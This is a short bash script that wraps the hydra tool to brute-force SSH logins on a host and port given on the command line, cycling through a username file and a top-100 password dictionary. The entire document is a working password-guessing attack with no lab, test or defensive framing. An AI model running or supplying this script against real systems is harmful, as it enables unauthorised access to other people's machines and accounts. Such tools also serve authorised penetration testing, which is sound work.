#!/bin/bash
if [ $# -eq 0 ]; then
    echo "Usage:./craskssh.sh <host> [port]"
    exit
fi

host=$1
port=22
if [ $# -eq 2 ]; then
    port=$2
fi
userfile="ssh_user.txt"
dicfile="dic/top100.txt"
hydra -v -t 4 -L $userfile -P $dicfile -s $port ssh://$host
